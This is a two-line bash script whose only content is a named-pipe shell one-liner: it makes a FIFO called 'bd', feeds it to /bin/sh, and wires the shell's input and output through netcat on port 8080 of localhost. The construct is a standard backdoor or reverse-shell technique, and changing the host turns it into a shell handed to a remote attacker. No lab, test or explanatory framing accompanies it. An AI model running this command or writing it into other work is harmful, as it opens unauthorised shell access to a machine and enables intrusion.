#!/bin/bash

mkfifo bd;cat bd|/bin/sh|nc localhost 8080 >bd
